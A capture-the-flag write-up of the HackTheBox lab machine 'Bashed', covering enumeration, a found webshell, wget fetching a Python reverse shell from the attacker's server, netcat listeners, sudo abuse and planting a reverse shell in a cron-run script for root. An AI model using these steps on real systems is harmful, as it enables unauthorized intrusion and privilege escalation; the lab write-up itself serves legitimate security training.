---
layout: single
title:  "HTB - Bashed Writeup - 10.10.10.68"
date:   2020-06-02 14:45:23 +0100
categories: hackthebox
excerpt: This is my writeup of the hackthebox.eu machine Bashed
---
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/6p348hw5z1adbqvs7fmt.png)

# HackTheBox - Bashed - 10.10.10.68 - Writeup

This machine is rated easy dificulty and requires knowledge of the linux `sudo and sudo -l` commands. The initial phase only requires some simple enumeration of an apache webpage which turns out to be running a webshell.

## 1. Recon

`nmap -sC -sV -oA nmap/bashed 10.10.10.68`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/bglot9fhkhbng2gwmt2b.png)
We can see that the only open port on the machine is Apache httpd

`http://10.10.10.68`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/cwowso1apsbjlsu6y0bd.png)
There is an article on the page stating that some sort of php file called `phpbash` was developed on the machine, we can try running `gobuster` to enumerate possible directories

`gobuster dir -u http://10.10.10.68 -w /usr/../.../..2.3-medium.txt`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/d56inr2lbco7247h8d5a.png)
We see that we got a hit for a `\dev` directory and seeing as the `phpbash` was developed on the machine there is a good chance it is in that directory

### Bingo! A webshell
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/8i2z7ksj1zs8rqydc59m.png)
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/iehnalebqmeagthoqbxn.png)


## 2. Exploitation
To exploit this machine is would be nicer to have an actual shell so I created a simple python reverse shell and started a netcat listener aswell as a python http server to get the file to the remote machine.
`cat rev.py`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/6y9pxw5ho3n1zzyo7mx3.png)
`which python`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/kxz7bosp99181t00u1xx.png)
`nc -lvnp 9004`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/pqrt3vzyqdd6q16cmyc6.png)
`wget 10.10.14.17/rev.py`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/stnh19xuhvs01sbzlszu.png)

### Reverse Shell
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/anz2m6esuqczb1yjjqsj.png)

Now that we have a proper shell we can do some enumeration and also read the user flag
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/wxcuu329pkw32deohsvs.png)
We can also see that there is a user `scriptmanager` who we could escalate privelages to
`sudo -l` - will tell use what commands we can run as other users
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/h56pqcy4uycdk90hgh73.png)
As we can run every command -  `All` as `scriptmanger` with no password, we can just spawn a shell as them using the bash command

`sudo -u scriptmanager /bin/bash` - will get us a shell as scriptmanger
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/v8dtetz5zu061uieplyt.png)

## 3. Privelage Escalation from scriptmanger to root

After some manual enumeration of the system there appears to be an unusual directory, `/scripts` which contains `test.py` and `test.txt`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/rpcza4tghrvseioryd14.png)
This python script seems to be run by some process, probably a cron job, we could try to exploit this by uploading a malicious python reverse shell to get a shell as root.
`cp rev.py revroot.py` `cat revroot.py`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/a7uymwadgmb0sdo96rlj.png)
Notice how our `revroot.py` file has a different port then out inital `rev.py` shell, this is so it does not interfere with our existing reverse shell.

We will upload `revroot.py` to the box using the same python http server
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/2y4ixykp1b5vsc2330qf.png)
`wget 10.10.14.17\revroot.py`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/gxu3hs1na6sbboxgys2t.png)

Now all we have to do is open a new netcat listener on port 1337 and wait
`nc -lvnp 1337`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/bgasnnw8iksrgizmkb1x.png)

## Rooted! 

If you enjoyed my writeup or found it useful consider checking out my github or my hackthebox profile.

<img src="http://www.hackthebox.eu/badge/image/210952" alt="Hack The Box">
<a href="https://dev.to/71xn">
  <img src="https://d2fltix0v2e0sb.cloudfront.net/dev-badge.svg" alt="Finn Lestrange's DEV Profile" height="30" width="30">
</a>

